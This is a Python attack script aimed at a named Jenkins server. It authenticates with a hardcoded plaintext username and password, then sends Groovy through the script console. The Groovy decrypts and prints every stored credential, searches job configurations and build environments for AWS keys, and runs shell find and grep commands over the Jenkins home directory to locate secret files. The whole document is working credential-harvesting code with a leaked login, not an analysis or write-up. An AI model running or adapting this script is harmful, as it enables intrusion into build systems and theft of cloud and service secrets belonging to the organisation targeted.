import requests
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False

crumb_r = s.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
crumb_r.raise_for_status()
crumb_data = crumb_r.json()
crumb_header = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[+] Crumb OK")


def run_groovy(script, label="", timeout=55):
    print(f"\n{'='*80}\n[*] {label}")
    resp = s.post(
        f"{JENKINS}/scriptText",
        data={"script": script, crumb_header: crumb_value},
        timeout=timeout
    )
    print(f"[+] Status: {resp.status_code} | Length: {len(resp.text)}")
    if resp.status_code == 200:
        print(resp.text)
    else:
        print(resp.text[:500])
    return resp.text if resp.status_code == 200 else ""


# Decrypt all Jenkins credentials using Hudson secret
q1 = r'''
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardCredentials
import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl
import org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl
import org.jenkinsci.plugins.plaincredentials.impl.FileCredentialsImpl
import hudson.util.Secret
import jenkins.model.Jenkins

println "=== ALL JENKINS CREDENTIALS (DECRYPTED) ==="
def creds = CredentialsProvider.lookupCredentials(StandardCredentials.class, Jenkins.instance, null, null)
creds.each { c ->
    println "\n--- ${c.class.simpleName} ---"
    println "  ID: ${c.id}"
    println "  Description: ${c.description}"
    if (c instanceof UsernamePasswordCredentialsImpl) {
        println "  Username: ${c.username}"
        println "  Password: ${c.password.plainText}"
    }
    if (c.hasProperty('secret')) {
        try { println "  Secret: ${c.secret.plainText}" } catch(e) {
            try { println "  Secret: ${c.secret}" } catch(e2) {}
        }
    }
    if (c.hasProperty('secretKey')) {
        try { println "  SecretKey: ${c.secretKey.plainText}" } catch(e) {}
    }
    if (c.hasProperty('accessKey')) {
        try { println "  AccessKey: ${c.accessKey}" } catch(e) {}
    }
    if (c.hasProperty('privateKey')) {
        try { println "  PrivateKey: ${c.privateKey}" } catch(e) {}
    }
    if (c.hasProperty('token')) {
        try { println "  Token: ${c.token.plainText}" } catch(e) {}
    }
}
'''
run_groovy(q1, "DECRYPT ALL CREDENTIALS")

# Also search for AWS-specific credential types
q2 = r'''
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardCredentials
import jenkins.model.Jenkins

println "=== SEARCHING FOR AWS-SPECIFIC CREDENTIAL TYPES ==="
def creds = CredentialsProvider.lookupCredentials(StandardCredentials.class, Jenkins.instance, null, null)
creds.each { c ->
    def cn = c.class.name
    if (cn.contains("AWS") || cn.contains("aws") || cn.contains("Amazon") || cn.contains("S3")) {
        println "\nAWS CRED FOUND: ${cn}"
        println "  ID: ${c.id}"
        println "  Desc: ${c.description}"
        c.properties.each { k, v ->
            if (k != "class") println "  ${k}: ${v}"
        }
    }
}

println "\n=== ALL CREDENTIAL CLASS TYPES ==="
creds.collect { it.class.name }.unique().each { println it }
'''
run_groovy(q2, "AWS-SPECIFIC CREDENTIAL TYPES")

# Search for env vars in job configs that reference AWS
q3 = r'''
import jenkins.model.Jenkins

println "=== JOBS WITH AWS/S3 IN ENVIRONMENT ==="
Jenkins.instance.allItems.each { item ->
    try {
        def config = item.configFile?.asString()
        if (config && (config =~ /(?i)(AWS_|AKIAJ|S3_|SECRET_KEY|ACCESS_KEY)/)) {
            println "\nJOB: ${item.fullName}"
            config.eachLine { line ->
                if (line =~ /(?i)(AWS_|AKIAJ|S3_|SECRET_KEY|ACCESS_KEY|amazon)/) {
                    println "  ${line.trim()}"
                }
            }
        }
    } catch(e) {}
}
'''
run_groovy(q3, "JOBS WITH AWS ENV VARS IN CONFIG")

# Check build env vars for recent builds
q4 = r'''
import jenkins.model.Jenkins

println "=== RECENT BUILD ENV VARS WITH AWS/S3 ==="
def count = 0
Jenkins.instance.allItems.take(50).each { item ->
    if (count > 10) return
    try {
        def build = item.lastBuild
        if (build) {
            def env = build.environment
            env.each { k, v ->
                if (k =~ /(?i)(AWS|S3|SECRET|ACCESS_KEY|CLOUD)/) {
                    println "JOB: ${item.fullName} | ${k} = ${v}"
                    count++
                }
            }
        }
    } catch(e) {}
}
'''
run_groovy(q4, "BUILD ENV VARS WITH AWS")

# Broader file search - check workspace and builds directories
q5 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home -maxdepth 3 -name '*.env' -o -name 'credentials' -o -name '*.properties' 2>/dev/null | head -40"].execute()
proc.waitFor()
println "=== FILES FOUND ==="
println proc.text

def proc2 = ["bash", "-c", "grep -r -l -i 'AKIAJ\\|aws_access_key\\|aws_secret' /var/jenkins_home/jobs/ --include='*.xml' --include='*.env' --include='*.properties' --include='*.groovy' -m 20 2>/dev/null | head -15"].execute()
proc2.waitFor()
println "\n=== FILES WITH AWS KEYS ==="
println proc2.text
'''
run_groovy(q5, "BROADER FILE SEARCH")
